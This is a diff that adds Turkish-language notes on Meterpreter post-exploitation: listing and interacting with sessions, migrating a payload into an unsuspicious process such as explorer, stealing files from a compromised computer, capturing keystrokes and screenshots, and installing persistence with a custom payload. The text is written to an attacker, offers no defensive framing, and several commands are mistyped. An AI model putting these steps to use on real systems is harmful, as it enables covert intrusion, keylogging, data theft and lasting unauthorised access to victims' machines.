@@ -1,0 +1,64 @@
+1-) Background
+
+2) Sessions -l
+
+3- Migrate
+
+4-) Sessions -i
+
+5-) Sysinfo
+
+6-) ipconfig
+
+
+meterpreterde haclediğimiz bilgisayara ps yazarsak bize o bilgisayarda çalışan prosesleri gösterir.
+
+şimdi burada insanların şüphenlenmeyeceği bir proses seç ve o prosesin İD sini alarak şu komudu yaz:
+
+migrate <İD of presess>
+
+bu komuttan sonra bizim payloadımız artık o çalışan prosesin içine girer ve o proses çalıştşığı sürece çalışmaya devam eder.
+
+not: proses olarak explorer kullanabilirsin.
+
+
+
+8-) Önemli Dosyaları Çalmak
+
+cd komutu ile C: klosörüne git ve orada user bul. ondan sonra desktop veya istediğin heryere gidebilirsin
+
+upload <yüklemek istediğin dosya>  //komutu bulunduğun dizine istediğin programı yükler.
+
+cat <içeriğini göremek istediğin dosya> // içeriğini gösteriir
+
+download <indirmek istediğin dosyanın adı> // haclediğin bilgisayardan bilgileri kendi bilgisayarına yükler.
+
+
+
+
+9-) Ekran Görüntüsü Almak
+
+keyscan start // klavyeden girilen bütün girdişeri alır ve kaydeder.
+
+keyscan_dump  // kaydedilen verileri gösterir.
+
+screenshot // ekran görüntüsü alır.
+
+
+
+
+10-) Bağlantıyı Sürdürülebilir Hale Getirmek.
+
+bunun için farklı bir exploit kullanmamız gerekiyor. msfconsole aç ve şunu gir:
+
+set payload exploit/windows/local/persistence
+
+set delay 10 // 10 saniye sonra payloadımız bizimle bağlantı kurmaya çalışacak.
+set exe name <payloadın isimini belirt>
+
+set seesion<haclediğin bilgisayarın açık olan session numarasını gir. örnek: session1>
+
+set EXE::Custom /var/www/html/payload.exe //kendi payloadımı kullanmak istediğim için payloadımızın yolu veriyorum.
+
+exploit  //herşey tamam
+
